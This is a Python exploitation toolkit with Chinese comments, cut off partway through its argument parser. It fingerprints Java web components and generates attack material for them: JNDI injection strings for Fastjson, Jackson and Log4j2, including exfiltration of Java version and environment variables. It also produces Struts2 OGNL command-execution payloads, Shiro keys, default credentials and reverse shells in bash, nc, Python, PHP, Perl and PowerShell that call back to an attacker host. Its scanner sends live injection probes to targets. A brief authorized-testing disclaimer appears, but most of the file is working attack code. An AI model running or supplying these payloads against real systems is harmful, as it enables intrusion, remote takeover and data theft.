#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
deserkit.py —— 反序列化漏洞工具箱（命令行版）

功能：
  1. scan     指纹识别（真实发包，多组件批量检测）
  2. payload  利用 Payload 生成（按组件 + 参数）
  3. shell    反弹 Shell 生成 / Base64 包装
  4. tools    工具库速查

仅用于授权的安全测试、企业自查与靶场练习。请勿对未授权目标使用。

依赖：Python 3 标准库（无需 pip install）
"""

import argparse
import base64
import concurrent.futures as cf
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

# Windows 控制台编码兜底
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

C_RED, C_GRN, C_YEL, C_DIM, C_END = "\033[31m", "\033[32m", "\033[33m", "\033[2m", "\033[0m"
if sys.platform == "win32":
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
    except Exception:
        C_RED = C_GRN = C_YEL = C_DIM = C_END = ""


def ok(s):   return C_GRN + s + C_END
def bad(s):  return C_RED + s + C_END
def warn(s): return C_YEL + s + C_END
def dim(s):  return C_DIM + s + C_END


# ============================================================
# HTTP 工具
# ============================================================
def normalize(url):
    url = (url or "").strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def http(url, method="GET", headers=None, data=None, timeout=8, allow_redirect=True):
    """返回 dict: {'status','headers'(dict,小写key),'body','err'}"""
    res = {"status": 0, "headers": {}, "body": "", "err": ""}
    req = urllib.request.Request(url, method=method)
    req.add_header("User-Agent", UA)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    if data is not None:
        if isinstance(data, str):
            data = data.encode("utf-8", "ignore")
        req.add_header("Content-Type", "application/json")
    try:
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=SSL_CTX))
        if not allow_redirect:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=SSL_CTX),
                urllib.request.HTTPRedirectHandler())
        with opener.open(req, data=data, timeout=timeout) as r:
            res["status"] = r.status
            res["headers"] = {k.lower(): v for k, v in r.getheaders()}
            try:
                res["body"] = r.read(60000).decode("utf-8", "ignore")
            except Exception:
                res["body"] = ""
    except urllib.error.HTTPError as e:
        res["status"] = e.code
        res["headers"] = {k.lower(): v for k, v in (e.headers or {}).items()}
        try:
            res["body"] = e.read(20000).decode("utf-8", "ignore")
        except Exception:
            pass
    except Exception as e:
        res["err"] = "%s: %s" % (type(e).__name__, e)
    return res


def get_root(url):
    m = urllib.parse.urlparse(url)
    return "%s://%s" % (m.scheme, m.netloc)


def probe_paths(base, paths, headers=None, timeout=8):
    """批量探测路径，返回 {path: status}"""
    out = {}
    for p in paths:
        u = base + "/" + p.lstrip("/") if p else base + "/"
        r = http(u, headers=headers, timeout=timeout)
        out[p] = r["status"]
    return out


# ============================================================
# 组件指纹检测
# ============================================================
def chk_shiro(base, to):
    r = http(base + "/", headers={"Cookie": "rememberMe=deleteMe;"}, timeout=to)
    sc = r["headers"].get("set-cookie", "")
    hit = "rememberMe=deleteMe" in sc or "rememberMe" in r["body"]
    ev = "Set-Cookie: %s" % sc if sc else ("响应体含 rememberMe" if hit else "无 rememberMe 特征")
    return ("Shiro", hit, ev,
            "拿到 key → Shiro-550；随机 key → Shiro-721。用 ShiroAttack2 爆破 key" if hit else "")


def chk_fastjson(base, to, dns=""):
    r = http(base + "/", method="POST",
             data='{"@type":"java.lang.AutoCloseable"', timeout=to)
    b = r["body"]
    hit = any(k in b for k in ("fastjson", "com.alibaba", "AutoCloseable", "JSONException"))
    return ("Fastjson", hit, "响应片段: %s" % b[:160].replace("\n", " ") if b else "无回显",
            "用布尔判定三件套确定版本区间；出网走 JNDI，不出网走 BCEL 链" if hit else
            "可手动 POST 到实际接收 JSON 的接口再试（本探测打的是根路径）")


def chk_log4j2(base, to, dns=""):
    note = "需手动 DNSLog 验证"
    if dns:
        payload = "${jndi:ldap://%s/a}" % dns
        http(base + "/", headers={"User-Agent": payload,
                                  "Referer": payload,
                                  "X-Forwarded-For": payload}, timeout=to)
        note = "已向 UA/Referer/XFF 注入 %s，请查看 DNSLog 是否收到请求" % payload
    return ("Log4j2", False, note,
            "无明显指纹只能盲打：所有会被记日志的输入点都打 ${jndi:ldap://dnslog/a}")


def chk_springboot(base, to):
    r = http(base + "/__deserkit_404__", timeout=to)
    wl = "Whitelabel Error Page" in r["body"]
    act = http(base + "/actuator", timeout=to)
    has_act = act["status"] == 200 and ("_links" in act["body"] or "self" in act["body"])
    hd = http(base + "/actuator/heapdump", timeout=to)
    hd_size = hd["headers"].get("content-length", "")
    hit = wl or has_act
    ev = []
    if wl:   ev.append("Whitelabel Error Page（错误页）")
    if has_act: ev.append("/actuator 可访问")
    if hd["status"] == 200: ev.append("/actuator/heapdump 可下载 (%s bytes)" % (hd_size or "?"))
    return ("SpringBoot", hit, "；".join(ev) or "未发现特征",
            "用 SBSCAN 专扫；heapdump 用 JDumpSpider 提取明文凭据" if hit else "")


def chk_jboss(base, to):
    codes = probe_paths(base, ["", "jmx-console/", "invoker/readonly",
                               "invoker/EJBInvokerServlet",
                               "jbossmq-httpil/HTTPServerILServlet"], timeout=to)
    r0 = http(base + "/", timeout=to)
    title = ("JBoss" in r0["body"]) or ("WildFly" in r0["body"])
    hit = title or codes.get("jmx-console/") == 200 or codes.get("invoker/readonly") != 404
    ev = "首页含 JBoss/WildFly: %s | 路径状态码: %s" % (title, json.dumps(codes, ensure_ascii=False))
    return ("JBoss/WildFly", hit, ev,
            "/invoker/readonly → CVE-2017-12149；/jbossmq-httpil → CVE-2017-7504；/jmx-console admin/admin"
            if hit else "")


def chk_jackson(base, to):
    r = http(base + "/", method="POST", data='{"a":[', timeout=to)
    b = r["body"]
    hit = any(k in b for k in ("fasterxml", "JsonMappingException", "MismatchedInputException"))
    return ("Jackson", hit, "响应片段: %s" % b[:160].replace("\n", " ") if b else "无回显",
            "关键：确认 @class 是否可用（enableDefaultTyping 是否开启）" if hit else "")


def chk_nacos(base, to):
    root = get_root(base)
    codes = probe_paths(root, ["nacos/", "nacos/v1/console/health"], timeout=to)
    r = http(root + "/nacos/v1/auth/users?pageNo=1&pageSize=9", timeout=to)
    ua_bypass = http(root + "/nacos/v1/auth/users?pageNo=1&pageSize=9",
                     headers={"User-Agent": "Nacos-Server"}, timeout=to)
    unauth = r["status"] == 200 and "username" in r["body"]
    bypass = ua_bypass["status"] == 200 and "username" in ua_bypass["body"]
    hit = codes.get("nacos/") == 200 or unauth or bypass
    ev = "状态码: %s | 未授权列用户: %s | UA绕过: %s" % (
        json.dumps(codes, ensure_ascii=False), unauth, bypass)
    return ("Nacos", hit, ev,
            "默认口令 nacos/nacos；UA: Nacos-Server 鉴权绕过（CVE-2021-29441）；<=2.2.0 有 Derby RCE"
            if hit else "若端口非 8848，请用 -u http://host:8848")


def chk_struts2(base, to):
    codes = probe_paths(base, ["index.action", "login.action", "index.do",
                               "__deserkit_404__.action"], timeout=to)
    r = http(base + "/__deserkit_404__.action", timeout=to)
    hit = ("Struts" in r["body"]) or any(v == 200 for v in codes.values())
    ev = "路径状态码: %s | 报错页含 Struts: %s" % (
        json.dumps(codes, ensure_ascii=False), "Struts" in r["body"])
    return ("Struts2", hit, ev,
            "用 Struts2Scan 确定编号（S2-045/057/061…），Content-Type 打 OGNL" if hit else "")


def chk_xxljob(base, to):
    root = get_root(base)
    r = http(root + "/xxl-job-admin/toLogin", timeout=to)
    hit = r["status"] == 200 and ("XXL-JOB" in r["body"] or "xxl-job" in r["body"].lower())
    host_part = root.rsplit(":", 1)
    run_res = None
    if len(host_part) == 2:
        # 形如 http://host:8080 → 拼出 http://host:9999
        scheme_host = host_part[0]
        if "://" in scheme_host and ":" not in scheme_host.split("://", 1)[1]:
            try:
                run_url = "%s:9999/run" % scheme_host
                run_res = http(run_url, method="POST",
                               data=json.dumps({"jobId": 1, "executorHandler": "demoJobHandler",
                                                "executorParams": "", "glueType": "GLUE_SHELL",
                                                "glueSource": "echo x"}), timeout=5)
            except Exception:
                pass
    ev = "/xxl-job-admin 状态码: %s" % r["status"]
    if run_res:
        ev += " | 执行器9999/run 状态码: %s %s" % (run_res["status"], run_res["body"][:60])
    return ("XXL-JOB", hit, ev,
            "默认口令 admin/123456；执行器无 accessToken 时 POST /run 直接 RCE" if hit else "")


def chk_weblogic(base, to):
    codes = probe_paths(base, ["console/", "console/login/LoginForm.jsp",
                               "wls-wsat/CoordinatorPortType",
                               "_async/AsyncResponseService"], timeout=to)
    r = http(base + "/console/login/LoginForm.jsp", timeout=to)
    hit = ("WebLogic" in r["body"]) or any(v == 200 for v in codes.values())
    ev = "路径状态码: %s | 含 WebLogic: %s" % (
        json.dumps(codes, ensure_ascii=False), "WebLogic" in r["body"])
    return ("Weblogic", hit, ev,
            "nmap --script weblogic-t3-info -p 7001 取版本；CVE-2017-10271 / CVE-2019-2725" if hit else "")


CHECKS = {
    "shiro":     lambda b, t, d: chk_shiro(b, t),
    "fastjson":  chk_fastjson,
    "log4j2":    chk_log4j2,
    "springboot": lambda b, t, d: chk_springboot(b, t),
    "jboss":     lambda b, t, d: chk_jboss(b, t),
    "jackson":   lambda b, t, d: chk_jackson(b, t),
    "nacos":     lambda b, t, d: chk_nacos(b, t),
    "struts2":   lambda b, t, d: chk_struts2(b, t),
    "xxljob":    lambda b, t, d: chk_xxljob(b, t),
    "weblogic":  lambda b, t, d: chk_weblogic(b, t),
}
ALL = list(CHECKS.keys())


# ============================================================
# scan 子命令
# ============================================================
def cmd_scan(a):
    urls = []
    if a.url:
        urls.append(normalize(a.url))
    if a.file:
        with open(a.file, "r", encoding="utf-8", errors="ignore") as f:
            urls += [normalize(x) for x in f if x.strip()]
    if not urls:
        print(bad("[!] 请用 -u 指定单个目标，或 -f 指定 url 列表文件"))
        return 1

    comps = [c.strip() for c in a.comp.split(",") if c.strip()] if a.comp else ALL
    comps = [c for c in comps if c in CHECKS]
    if not comps:
        print(bad("[!] 未知组件，可选: " + ", ".join(ALL)))
        return 1

    print("=" * 78)
    print("目标 %d 个 | 组件 %s | 超时 %ss | 线程 %d" % (len(urls), ",".join(comps), a.timeout, a.threads))
    print("=" * 78)

    results = {}

    def work(u):
        row = {"url": u, "hits": [], "detail": []}
        for c in comps:
            try:
                name, hit, ev, tip = CHECKS[c](u, a.timeout, a.dnslog)
            except Exception as e:
                continue
            row["detail"].append({"comp": name, "hit": hit, "evidence": ev, "tip": tip})
            if hit:
                row["hits"].append(name)
        return row

    with cf.ThreadPoolExecutor(max_workers=a.threads) as ex:
        for row in ex.map(work, urls):
            results[row["url"]] = row
            print("\n[%s] %s" % (ok("TARGET") if row["hits"] else dim("--"), row["url"]))
            for d in row["detail"]:
                if d["hit"]:
                    print("   %s %-14s %s" % (ok("[+]"), d["comp"], d["evidence"][:100]))
                    if d["tip"]:
                        print("       %s→ %s" % (dim(""), d["tip"]))
                elif a.verbose:
                    print("   %s %-14s %s" % (dim("[-]"), d["comp"], d["evidence"][:80]))
            if not row["hits"]:
                print("   %s 未命中任何组件指纹（可用 -v 查看明细）" % dim("[-]"))

    if a.out:
        with open(a.out, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print("\n%s 结果已写入 %s" % (ok("[+]"), a.out))
    return 0


# ============================================================
# payload 子命令
# ============================================================
def b64s(s):
    return base64.b64encode(s.encode()).decode()


PAYLOADS = {
    "fastjson": {
        "1.2.24 JNDI (LDAP)": '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
                              '"dataSourceName":"ldap://{LHOST}:1389/Exploit","autoCommit":true}',
        "1.2.24 JNDI (RMI)": '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
                             '"dataSourceName":"rmi://{LHOST}:{JRMP}/obj","autoCommit":true}',
        "1.2.47 java.lang.Class 绕过": '{"a":{"@type":"java.lang.Class",'
                                       '"val":"com.sun.rowset.JdbcRowSetImpl"},'
                                       '"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",'
                                       '"dataSourceName":"ldap://{LHOST}:1389/Exploit","autoCommit":true}}',
        "1.2.68 AutoCloseable 绕过": '{"@type":"java.lang.AutoCloseable",'
                                     '"@type":"com.sun.rowset.JdbcRowSetImpl",'
                                     '"dataSourceName":"ldap://{LHOST}:1389/Exploit","autoCommit":true}',
        "1.2.80 Exception 绕过": '{"@type":"java.lang.Exception",'
                                 '"@type":"com.sun.rowset.JdbcRowSetImpl",'
                                 '"dataSourceName":"ldap://{LHOST}:1389/Exploit","autoCommit":true}',
        "BCEL 不出网 (dbcp2)": '{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",'
                               '"driverClassName":"$$BCEL$$<填BCEL编码>","driverClassLocation":""}',
        "DNSLog 探测": '{"@type":"java.net.Inet4Address","val":"{DNS}"}',
        "布尔判定-Class链": '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},'
                            '"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",'
                            '"dataSourceName":"ldap://{DNS}/t","autoCommit":true}}',
        "布尔判定-AutoCloseable": '{"zero":{"@type":"java.lang.AutoCloseable",'
                                  '"@type":"java.io.ByteArrayOutputStream"}}',
        "布尔判定-Exception": '{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}',
    },
    "log4j2": {
        "基础 LDAP": "${jndi:ldap://{LHOST}:1389/Exploit}",
        "基础 RMI": "${jndi:rmi://{LHOST}:{JRMP}/Exploit}",
        "DNSLog 探测": "${jndi:ldap://{DNS}/a}",
        "绕WAF-lower": "${${lower:j}ndi:ldap://{LHOST}:1389/Exploit}",
        "绕WAF-::-j": "${${::-j}ndi:ldap://{LHOST}:1389/Exploit}",
        "绕WAF-大小写": "${jNdI:lDaP://{LHOST}:1389/Exploit}",
        "信息外带-Java版本": "${jndi:ldap://${java:version}.{DNS}/a}",
        "信息外带-环境变量": "${jndi:ldap://${env:USER}.{DNS}/a}",
    },
    "struts2": {
        "S2-045 命令执行": "%{(#n='multipart/form-data')."
                           "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                           "(#_memberAccess?(#_memberAccess=#dm):"
                           "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                           "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                           "(#ognlUtil.getExcludedPackageNames().clear())."
                           "(#ognlUtil.getExcludedClasses().clear())."
                           "(#context.setMemberAccess(#dm)))).(#cmd='{CMD}')."
                           "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                           "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                           "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
                           "(#process=#p.start())."
                           "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                           "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        "S2-045 反弹Shell": "%{(#n='multipart/form-data')."
                            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                            "(#_memberAccess=#dm)."
                            "(#cmd='bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1')."
                            "(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd}))."
                            "(#process=#p.start())}",
        "S2-045 无害探测": "%{(#n='multipart/form-data')."
                           "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                           "(#_memberAccess=#dm)."
                           "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter()))."
                           "(#ros.print('\\ntest\\n\\n'))}",
        "通用命令执行(简版)": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm)."
                             "(#cmd='{CMD}').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd}))."
                             "(#process=#p.start())."
                             "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                             "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
    },
    "shiro": {
        "框架探测 Cookie": "rememberMe=deleteMe;",
        "默认Key": "kPH+bIxk5D2deZiIxcaaaA==",
        "常用Key字典(部分)": "kPH+bIxk5D2deZiIxcaaaA==\n2AvVhdsgUs0FSA3SDFAdag==\n"
                             "3AvVhmFLUs0KTA3Kprsdag==\n4AvVhmFLUs0KTA3Kprsdag==\n"
                             "wGiHplamyXlVB11UXWol8g==\nfCq+/xW488hMTCD+cmJ3aQ==\n"
                             "1QWLxg+NYmxraMoxAXu/Iw==\nZ3VucwAAAAAAAAAAAAAAAA==\n"
                             "U3ByaW5nQmxhZGUAAAAAAA==\nZUdsaGJuSmxibVI2ZHc9PQ==\n"
                             "bWljcm9zAAAAAAAAAAAAAA==\nMWJjNmQ3MjEzMzZjODM2NQ==\n"
                             "ZGVmYXVsdF9jaXBoZXJrZXk=\n2itfHvFqDZF7Htc1vT1wcQ==\n"
                             "QJpM8T7rSZAGXvF0QwKoQA==",
        "利用链推荐": "CommonsBeanutils1 (首选) / CommonsCollections5 / CommonsCollections6 / CommonsCollections7",
    },
    "jboss": {
        "CVE-2017-12149 入口": "{TARGET}/invoker/readonly",
        "CVE-2017-7504 入口": "{TARGET}/jbossmq-httpil/HTTPServerILServlet",
        "JMX Console": "{TARGET}/jmx-console/   (默认 admin/admin)",
    },
    "nacos": {
        "未授权列用户": "{TARGET}/nacos/v1/auth/users?pageNo=1&pageSize=9",
        "鉴权绕过头": "User-Agent: Nacos-Server",
        "配置泄露": "{TARGET}/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=99",
        "默认口令": "nacos / nacos",
    },
    "xxljob": {
        "执行器 RCE (POST /run)": '{"jobId":1,"executorHandler":"demoJobHandler",'
                                  '"executorParams":"","executorBlockStrategy":"COVER_EARLY",'
                                  '"executorTimeout":0,"logId":1,"logDateTime":1586629003729,'
                                  '"glueType":"GLUE_SHELL","glueSource":"{CMD}",'
                                  '"glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}',
        "执行器反弹Shell": '{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"",'
                           '"glueType":"GLUE_SHELL",'
                           '"glueSource":"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",'
                           '"logId":1,"logDateTime":1586629003729,"glueUpdatetime":1586699003758,'
                           '"broadcastIndex":0,"broadcastTotal":0}',
        "调度中心默认口令": "admin / 123456",
    },
    "springboot": {
        "Actuator 枚举": "{TARGET}/actuator",
        "heapdump": "{TARGET}/actuator/heapdump",
        "env 泄露": "{TARGET}/actuator/env",
        "Gateway RCE 路由": '{"id":"hacktest","filters":[{"name":"AddResponseHeader",'
                            '"args":{"name":"Result","value":"#{new String('
                            'T(org.springframework.util.StreamUtils).copyToByteArray('
                            'T(java.lang.Runtime).getRuntime().exec(new String[]{\\"{CMD}\\"})'
                            '.getInputStream()))}"}}],"uri":"http://example.com"}',
    },
    "jackson": {
        "JNDI (需 enableDefaultTyping)": '{"obj":{"@class":"com.sun.rowset.JdbcRowSetImpl",'
                                         '"dataSourceName":"ldap://{LHOST}:1389/Exploit","autoCommit":true}}',
        "@class 探测": '{"obj":{"@class":"java.net.Inet4Address","val":"{DNS}"}}',
    },
}

PAYLOAD_CMDS = {
    "fastjson": [
        "# 1) 攻击机起 JNDI 服务（推荐 JNDIExploit 一键）：",
        "java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {LHOST}",
        "#   然后 dataSourceName 用：ldap://{LHOST}:1389/Basic/Command/{CMD}",
        "#   或反弹：ldap://{LHOST}:1389/Basic/ReverseShell/{LHOST}/{LPORT}",
        "",
        "# 2) 传统方式（marshalsec）：",
        "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "
        '"http://{LHOST}:8000/#Exploit"',
        "",
        "# 3) 发送：",
        'curl -s -X POST "{TARGET}" -H "Content-Type: application/json" -d @payload.json',
    ],
    "log4j2": [
        "java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {LHOST}",
        "# 然后打：${jndi:ldap://{LHOST}:1389/Basic/Command/{CMD}}",
        "#  或：${jndi:ldap://{LHOST}:1389/Basic/ReverseShell/{LHOST}/{LPORT}}",
    ],
    "shiro": [
        "# 1) 攻击机起 JRMP 监听（ysoserial 需 JDK 8 运行）：",
        "java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener {JRMP} CommonsBeanutils1 \\",
        '  "bash -c bash${IFS}-i${IFS}>&/dev/tcp/{LHOST}/{LPORT}${IFS}<&1"',
        "",
        "# 2) 另开终端监听反弹 shell：",
        "nc -lvvp {LPORT}",
        "",
        "# 3) 生成 rememberMe Cookie（shiropoc.py，需 pycryptodome）：",
        "python3 shiropoc.py {LHOST}:{JRMP}",
        "",
        "# 4) 打过去：",
        'curl -s "{TARGET}" -H "Cookie: rememberMe=<生成的值>"',
        "",
        "# 推荐图形化：ShiroAttack2（自动爆破 key + 选链 + 命令执行 + 内存马）",
    ],
    "jboss": [
        "# 1) 生成 payload（JDK 8）：",
        "java -jar ysoserial-all.jar CommonsCollections5 "
        '"bash -c bash${IFS}-i${IFS}>&/dev/tcp/{LHOST}/{LPORT}${IFS}<&1" > payload.ser',
        "",
        "# 2) 监听：",
        "nc -lvnp {LPORT}",
        "",
        "# 3) 发送：",
        "curl -X POST --data-binary @payload.ser {TARGET}/invoker/readonly",
    ],
    "struts2": [
        "# S2-045：把 payload 作为 Content-Type 头发送，命令回显在响应体",
        'curl -s -X POST "{TARGET}/index.action" -H "Content-Type: <payload>"',
        "",
        "# 一键工具：python3 Struts2Scan.py -u {TARGET}",
    ],
    "nacos": [
        'curl -s "{TARGET}/nacos/v1/auth/users?pageNo=1&pageSize=9" -H "User-Agent: Nacos-Server"',
        'curl -s -X POST "{TARGET}/nacos/v1/auth/users/login" -d "username=nacos&password=nacos"',
    ],
    "xxljob": [
        "# 攻击机先监听：nc -lvnp {LPORT}",
        'curl -s -X POST "http://HOST:9999/run" -H "Content-Type: application/json" -d @p.json',
    ],
    "springboot": [
        "python3 SBSCAN.py -u {TARGET}",
        "curl -s -o heapdump.hprof {TARGET}/actuator/heapdump",
        "java -jar JDumpSpider.jar heapdump.hprof",
    ],
    "jackson": [
        "java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {LHOST}",
    ],
}


def cmd_payload(a):
    c = a.comp
    if c not in PAYLOADS:
        print(bad("[!] 未知组件，可选: " + ", ".join(PAYLOADS.keys())))
        return 1
    rev = "bash -i >& /dev/tcp/%s/%s 0>&1" % (a.lhost, a.lport)
    rep = {
        "{LHOST}": a.lhost, "{LPORT}": a.lport, "{JRMP}": a.jrmp,
        "{DNS}": a.dnslog, "{CMD}": a.cmd, "{TARGET}": a.target,
        "{B64}": b64s(rev),
    }

    def fill(s):
        for k, v in rep.items():
            s = s.replace(k, v)
        return s

    print("=" * 78)
    print("Payload 生成 —— %s" % c.upper())
    print("参数: LHOST=%s LPORT=%s JRMP=%s DNS=%s CMD=%s" % (a.lhost, a.lport, a.jrmp, a.dnslog, a.cmd))
    print("=" * 78)
    for title, p in PAYLOADS[c].items():
        print("\n%s %s" % (ok("●"), bad(title)))
        print(fill(p))
    if c in PAYLOAD_CMDS:
        print("\n" + "-" * 78)
        print(warn("配套命令："))
        for line in PAYLOAD_CMDS[c]:
            print(fill(line))
    return 0


# ============================================================
# shell 子命令
# ============================================================
SHELLS = {
    "bash":    "bash -i >& /dev/tcp/{L}/{P} 0>&1",
    # Java Runtime.getRuntime().exec(String) 场景：按空白 tokenize、不经过 shell。
    # 把空格换成 ${IFS}（bash 自己展开成空格）→ 单个 argv，无需管道/引号/base64。
    # 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 时，重定向的目标词不做字段切分，
    # `/dev/tcp/.../P${IFS}0` 展开成 2 段 → bash 报 ambiguous redirect，连都不连。
    # （花括号+base64 那套其实能用，但依赖目标有 base64，故统一用 ${IFS} 版。）
    "bashifs": "bash -c bash${IFS}-i${IFS}>&/dev/tcp/{L}/{P}${IFS}<&1",
    "nc":      "nc -e /bin/bash {L} {P}",
    "ncmk":    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {L} {P} >/tmp/f",
    "py":      'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{L}",{P}));'
               'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
               'import pty;pty.spawn("/bin/bash")\'',
    "php":     'php -r \'$sock=fsockopen("{L}",{P});exec("/bin/bash -i <&3 >&3 2>&3");\'',
    "perl":    'perl -e \'use Socket;$i="{L}";$p={P};socket(S,PF_INET,SOCK_STREAM,'
               'getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
               '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'',
    "ps":      '$client=New-Object System.Net.Sockets.TCPClient("{L}",{P});'
               '$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};'
               'while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object '
               '-TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data '
               '2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";'
               '$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
               '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
}


def cmd_shell(a):
    rev = "bash -i >& /dev/tcp/%s/%s 0>&1" % (a.lhost, a.lport)
    b = b64s(rev)
    print("=" * 78)
    print("反弹 Shell　LHOST=%s LPORT=%s" % (a.lhost, a.lport))
    print("=" * 78)
    for k, tpl_ in SHELLS.items():
        s = tpl_.replace("{L}", a.lhost).replace("{P}", a.lport).replace("{B64}", b)
        print("\n%s %s" % (ok("●"), bad(k)))
        print(s)
    print("\n" + "-" * 78)
    print(warn("Java Runtime.exec(String) 用上面 bashifs 那条：空格全换成 ${IFS}，"))
    print(warn("结尾别写成 ${IFS}0>&1：重定向目标词不做字段切分，会报 ambiguous redirect。"))
    print("\n" + warn("攻击机监听:"))
    print("nc -lvnp %s" % a.lport)
    return 0


# ============================================================
# tools 子命令
# ============================================================
TOOLDB = {
    "通用": [
        ("ysoserial", "Java 反序列化 payload 生成器（必备）", "https://github.com/frohoff/ysoserial"),
        ("marshalsec", "起恶意 LDAP/RMI 服务", "https://github.com/mbechler/marshalsec"),
        ("JNDIExploit", "JNDI 一键利用（命令执行/反弹/内存马）", "https://github.com/WhiteHSBG/JNDIExploit"),
        ("nuclei", "模板化漏洞扫描，全组件覆盖", "https://github.com/projectdiscovery/nuclei"),
        ("xray", "主动扫描", "https://github.com/chaitin/xray"),
    ],
    "Shiro": [
        ("ShiroAttack2", "爆破 key + 选链 + 命令执行 + 内存马", "https://github.com/SummerSec/ShiroAttack2"),
        ("ShiroExploit", "探测 key + 生成 rememberMe", "https://github.com/feihong-cs/ShiroExploit-Deprecated"),
    ],
    "Fastjson": [
        ("BcelPayloadGenerator", "BCEL 不出网 payload 生成", "https://github.com/OneSourceCat/BcelPayloadGenerator"),
        ("fastJsonNoNetTool", "BCEL 转码 + Payload 生成（GUI）", "https://github.com/yeyeye888/fastJsonNoNetTool"),
        ("fastjsonScan", "Burp 插件：版本探测 + 利用", "https://github.com/zilong3033/fastjsonScan"),
    ],
    "Log4j2": [
        ("JNDIExploit", "一键起 LDAP/RMI + 命令执行", "https://github.com/WhiteHSBG/JNDIExploit"),
    ],
    "Struts2": [
        ("Struts2Scan", "自带多 CVE 扫描 + 利用", "https://github.com/HatBoy/Struts2-Scan"),
    ],
    "SpringBoot": [
        ("SBSCAN", "SpringBoot 专扫", "https://github.com/sule01u/SBSCAN"),
        ("JDumpSpider", "heapdump 敏感信息提取", "https://github.com/whwlsfb/JDumpSpider"),
        ("heapdump_tool", "heapdump 提取", "https://github.com/wyzxxz/heapdump_tool"),
        ("SpringBootVul-GUI", "GUI 版漏洞利用", "https://github.com/wh1t3zer/SpringBootVul-GUI"),
    ],
    "资产": [
        ("fofa", "资产搜索", "https://fofa.info"),
        ("quake", "资产搜索", "https://quake.360.net"),
        ("hunter", "资产搜索", "https://hunter.qianxin.com"),
        ("httpx", "批量存活探测", "https://github.com/projectdiscovery/httpx"),
    ],
}


def cmd_tools(a):
    print("=" * 78)
    print("工具库速查")
    print("=" * 78)
    for cat in (a.cat.split(",") if a.cat else TOOLDB.keys()):
        cat = cat.strip()
        if cat not in TOOLDB:
            continue
        print("\n%s %s" % (ok("【"), bad(cat) + ok("】")))
        for name, desc, url in TOOLDB[cat]:
            print("  %-24s %-42s %s" % (warn(name), desc, dim(url)))
    return 0


# ============================================================
def main():
    p = argparse.ArgumentParser(
        prog="deserkit.py",
        description="反序列化漏洞工具箱：指纹识别 / 版本探测 / Payload 生成 / 利用工具\n"
                    "【仅限授权测试与靶场练习】",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("scan", help="指纹识别（真实发包）")
    s.add_argument("-u", "--url", help="单个目标，如 http://192.168.1.10:8080")
    s.add_argument("-f", "--file", help="目标列表文件（每行一个 URL）")
